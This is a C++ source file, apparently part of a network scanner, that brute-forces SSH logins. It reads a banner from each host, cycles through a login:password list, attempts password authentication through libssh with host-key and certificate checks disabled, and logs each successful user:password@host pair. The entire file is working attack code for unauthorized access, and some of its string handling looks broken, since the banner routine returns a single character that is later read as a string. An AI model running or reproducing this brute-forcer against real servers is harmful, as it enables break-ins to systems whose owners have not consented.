#include "SSHAuth.h"
#include "FileUpdater.h"

int _sshConnect(const char *user, const char *pass, const char *host, int port) {

    CURL *curl = curl_easy_init();
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 0L);
    char hostStr[128] = {0};
    ZeroMemory(hostStr, sizeof(hostStr));
    strcpy(hostStr, user);
    strcat(hostStr, "@");
    strcat(hostStr, host);
    int sshTimeout = gTimeOut + 1;

    if (curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, host);
        curl_easy_setopt(curl, CURLOPT_PORT, port);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        int proxyPort = std::atoi(gProxyPort);
        if(strlen(gProxyIP) != 0 && (proxyPort > 0 && proxyPort < 65535)) {
            curl_easy_setopt(curl, CURLOPT_PROXY, gProxyIP);
            curl_easy_setopt(curl, CURLOPT_PROXYPORT, proxyPort);
        } else {
            curl_easy_setopt(curl, CURLOPT_PROXY, "");
        }
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, gTimeOut);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, gTimeOut);
        curl_easy_setopt(curl, CURLOPT_CONNECT_ONLY, 1L);

        int res = curl_easy_perform(curl);

        socket_t sock;
        curl_easy_getinfo(curl, CURLINFO_LASTSOCKET, &sock);

        if(res != CURLE_OK) {
            curl_easy_cleanup(curl);
            ++ssh;
            stt->doEmitionRedFoundData("[SSH]Cannot connect to: " + QString(host) + ":" + QString::number(port));
            return 0;
        }

        if(sock != -1) {
            ssh_session ssh_session = ssh_new();
            if (ssh_session == NULL)
            {
                ssh_free(ssh_session);
                curl_easy_cleanup(curl);
                return -1;
            };

            ssh_options_set(ssh_session, SSH_OPTIONS_STRICTHOSTKEYCHECK, 0);
            ssh_options_set(ssh_session, SSH_OPTIONS_GSSAPI_DELEGATE_CREDENTIALS, 0);
            ssh_options_set(ssh_session, SSH_OPTIONS_TIMEOUT, &sshTimeout);

            //Fails to work on libssh-4.5 https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=688700
            res = ssh_options_set(ssh_session, SSH_OPTIONS_FD, &sock);

            res = ssh_connect(ssh_session);

            if (res != SSH_OK) //Offline
            {
                ssh_disconnect(ssh_session);
                ssh_free(ssh_session);
                curl_easy_cleanup(curl);
                ++offlines;
                return -2;
            }
            else
            {
                res = ssh_userauth_password(ssh_session, NULL, pass);
                if (res != SSH_AUTH_SUCCESS)
                {
                    ssh_disconnect(ssh_session);
                    ssh_free(ssh_session);
                    curl_easy_cleanup(curl);
                    return -1;
                };
            };

            ssh_disconnect(ssh_session);
            ssh_free(ssh_session);
        } else {
            stt->doEmitionRedFoundData("[SSH]Socket = -1 " + QString(host) + ":" + QString::number(port));
        }
    }

    curl_easy_cleanup(curl);
    ++ssh;
    return 0;
}

char _get_ssh_banner(const char *ip, int port) {
    char recvBuff[256] = {0};
    std::string buffer;
    Connector::nConnect(ip, port, &buffer);

    int sz = buffer.size();

    if(sz != 0)
    {
        strncpy(recvBuff, buffer.c_str(), sz < 256 ? sz : 256);
    };

    return *recvBuff;
}

int check_ssh_pass(const char *user, const char *pass,
                   const char *userPass, const char *host, int port,
                   std::string *buffer, const char *banner) {
    int res = -1;
    if(BALogSwitched) stt->doEmitionBAData("Probing SSH: " + QString(userPass) + "@" + QString(host) + ":" + QString::number(port));

    res = _sshConnect(user, pass, host, port);

    if(res == 0)
    {
        stt->doEmition_BAGreenData("[+] SSH: " + QString(userPass) + "@" + QString(host));
        buffer->append(userPass);
        buffer->append("@");
        buffer->append(host);
        buffer->append("|+|");
        buffer->append(banner);
        return 0;
    };

    return res;
}

int SSHBrute(const char* host, int port, std::string *buffer, const char *banner) {
    char login[32] = {0};
    char pass[32] = {0};
    char temp[64] = {0};
    char *ptr1 = 0;
    int res = -1;

    for(int i = 0; i < MaxSSHPass; ++i)
    {
        if(!globalScanFlag) break;
        strcpy(temp, sshlpLst[i]);
        ptr1 = strstr(temp, ":");

        if (ptr1 == NULL) {
            stt->doEmitionRedFoundData("[SSH]Wrong format: " + QString(temp));
            return -1;
        }

        strncpy(login, temp, ptr1 - temp);
        strcpy(pass, ptr1 + 1);
        res = check_ssh_pass(login, pass, temp, host, port, buffer, banner);
        ZeroMemory(login, sizeof(login));
        ZeroMemory(pass, sizeof(pass));
        ZeroMemory(temp, sizeof(temp));

        if(res == 0)
        {
            if(i == 0) return -2; //Failhit
            return 1;
        }
        else if(res == -2)
        {
            return -2;
        };

        Sleep(500);
    };
    return -1;
}

QString strIP;
QString strPort;
int SSHAuth::SSHLobby(const char *ip, int port, std::string *buffer)
{
    const char &banner = _get_ssh_banner(ip, port);
    if(strlen(&banner) > 0)
    {
        BruteUtils::BConInc();
        int res = SSHBrute(ip, port, buffer, &banner);
        BruteUtils::BConDec();
        return res;
    };
    return -1;
}
